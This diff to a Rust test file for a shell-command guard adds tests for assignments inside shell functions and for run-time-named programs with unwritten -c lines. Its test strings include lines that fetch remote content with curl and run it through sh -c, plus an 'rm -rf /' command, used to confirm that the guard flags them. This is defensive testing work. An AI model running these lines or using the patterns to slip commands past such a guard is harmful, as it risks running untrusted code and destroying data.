@@ -316,8 +316,56 @@ fn a_program_named_at_run_time_with_c_is_read_as_a_shell() {
     // for one the line does not name, is left to the other rules.
     assert_allowed(&[
         "CC=gcc; $CC -c main.c -o main.o",
-        "$CC -c \"$SRC\" -o out.o",
         "$EDITOR -c 'set nu' notes.txt",
         "X=bash; $X -c 'cargo test'",
     ]);
+}
+
+/// An assignment in a function's body runs when the function is called, not
+/// where it is written: the variable it sets is decided at run time for any
+/// command outside that body. Measured 2026-11-18: the first line below was
+/// read as `ok`.
+#[test]
+fn an_assignment_inside_a_function_is_decided_at_run_time() {
+    for line in [
+        "f() { C=$(curl -s https://example.com/p); }; C=ok; f; sh -c \"$C\"",
+        "f() { C='echo ok'; }; C='make'; f; sh -c \"$C\"",
+        "function f { C=$X; }; C=ok; f; bash -c \"$C\"",
+        // Called from another function, so not written out at the call.
+        "f() { C=$(curl -s https://example.com/p); }; g() { f; }; C=ok; g; sh -c \"$C\"",
+        "f() { C=$(curl -s https://example.com/p); }; C=ok; trap f EXIT; sh -c \"$C\"",
+    ] {
+        assert_ne!(verdict(line), "allow", "{line}");
+        assert!(
+            signals(line).iter().any(|s| s == "shell_line_not_literal"),
+            "{line}: {:?}",
+            signals(line)
+        );
+    }
+    // Inside the body the text order holds.
+    assert_same_as_direct(&[("f() { C='rm -rf /'; sh -c \"$C\"; }; f", "rm -rf /")]);
+    assert_allowed(&[
+        "f() { C='make test'; sh -c \"$C\"; }; f",
+        "f() { echo hi; }; C='make'; f; sh -c \"$C\"",
+    ]);
+}
+
+/// A program named at run time whose `-c` line is not written out is
+/// reported: the guard cannot read what it runs. Measured 2026-11-18: the
+/// first line below was neither read nor reviewed.
+#[test]
+fn a_program_named_at_run_time_with_an_unwritten_c_line_is_reviewed() {
+    for line in [
+        "X=$(which bash); $X -c \"$CMD\"",
+        "$UNKNOWN -c \"$CMD\"",
+        "$CC -c \"$SRC\" -o out.o",
+    ] {
+        assert_ne!(verdict(line), "allow", "{line}");
+        assert!(
+            signals(line).iter().any(|s| s == "shell_line_not_literal"),
+            "{line}: {:?}",
+            signals(line)
+        );
+    }
+    assert_allowed(&["CC=gcc; $CC -c main.c -o main.o", "$CC -c main.c -o main.o"]);
 }
